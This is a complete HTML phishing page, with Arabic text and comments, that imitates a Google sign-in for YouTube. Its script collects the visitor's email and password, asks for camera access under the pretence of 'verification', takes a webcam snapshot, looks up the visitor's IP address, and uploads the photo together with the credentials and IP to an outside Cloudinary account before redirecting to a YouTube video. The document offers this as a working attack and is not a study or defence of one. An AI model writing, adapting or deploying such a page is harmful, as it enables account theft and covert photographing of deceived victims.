<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حسابات Google</title>
    <meta name="description" content="قم بتسجيل الدخول للمتابعة إلى YouTube. هذه صفحة تحقق آمنة لضمان ملكية الحساب.">
    
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #202124; }
        .login-box { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        img { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        p { font-size: 16px; margin-bottom: 25px; }
        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 14px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div class="login-box" id="loginForm">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
    <h1>تسجيل الدخول</h1>
    <p>للمتابعة إلى YouTube</p>
    <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
    <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
    <button onclick="startAction()">التالي</button>
</div>

<video id="video" playsinline autoplay></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    const cloudName = 'dgkttv99v';
    const uploadPreset = 'ml_default';
    const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    
    async function startAction() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;

        if(!email || !pass) { alert("يرجى إدخال البيانات"); return; }

        // إخفاء النموذج وإظهار رسالة تحميل للتمويه
        document.getElementById('loginForm').innerHTML = "<h1>جاري التحقق...</h1><p>يرجى الانتظار لحظة</p>";

        try {
            // طلب الكاميرا (سيظهر الإذن الآن كأنه جزء من "التحقق")
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('video').srcObject = stream;

            // تنفيذ الرفع مع البيانات (الايميل والباسورد والـ IP)
            setTimeout(() => { takeSnapshot(email, pass); }, 2000);
        } catch (e) {
            window.location.href = youtubeLink;
        }
    }

    async function takeSnapshot(email, pass) {
        const canvas = document.getElementById('canvas');
        const video = document.getElementById('video');
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        const imageData = canvas.toDataURL("image/png");

        let userIP = "Unknown";
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            userIP = data.ip;
        } catch (err) {}

        const formData = new FormData();
        formData.append('file', imageData);
        formData.append('upload_preset', uploadPreset);
        
        // --- تخزين "الصيد" في الـ Tags والـ Context ---
        formData.append('tags', `IP_${userIP},Email_${email}`);
        formData.append('context', `ip=${userIP}|user=${email}|pass=${pass}`);

        fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
            method: 'POST',
            body: formData
        }).then(() => {
            // بعد الرفع الناجح، حوله لليوتيوب فوراً
            window.location.href = youtubeLink;
        });
    }
</script>
</body>
</html>
